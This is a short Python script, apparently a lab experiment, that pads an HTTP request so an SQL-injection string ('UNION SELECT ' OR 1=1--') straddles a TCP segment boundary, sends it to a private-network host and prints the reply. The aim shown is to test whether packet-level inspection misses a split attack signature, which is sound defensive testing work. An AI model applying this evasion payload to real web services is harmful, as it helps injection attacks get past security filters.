import socket

HOST = "192.168.0.2"
PORT = 8000

TCP_PAYLOAD_SIZE = 448

request_prefix = "GET /search?q="
attack = "UNION SELECT ' OR 1=1--"
request_suffix = (
    "B" * 300
    + " HTTP/1.1\r\n"
    + "Host: 192.168.0.2:8000\r\n"
    + "User-Agent: boundary-sqli-test\r\n"
    + "Connection: close\r\n"
    + "\r\n"
)

# Make "UNION SELEC" occupy bytes 437-447.
attack_offset = TCP_PAYLOAD_SIZE - len("UNION SELEC")

padding_length = attack_offset - len(request_prefix)

if padding_length < 0:
    raise RuntimeError("Prefix is already beyond TCP boundary")

request = (
    request_prefix
    + ("A" * padding_length)
    + attack
    + request_suffix
).encode()

attack_position = request.find(attack.encode())

print("================================")
print("SQLi TCP-boundary experiment")
print("================================")
print(f"Request length : {len(request)}")
print(f"Attack offset  : {attack_position}")
print(f"TCP boundary   : {TCP_PAYLOAD_SIZE}")
print()

print("Boundary:")
print(repr(request[428:468]))
print()

print("Expected boundary:")
print("  TCP #1: ...UNION SELEC")
print("  TCP #2: T ' OR 1=1--...")
print()

with socket.create_connection((HOST, PORT)) as s:
    print("Sending ONE application write...")
    s.sendall(request)

    response = s.recv(4096)

    print("Response:")
    print(response.decode(errors="replace"))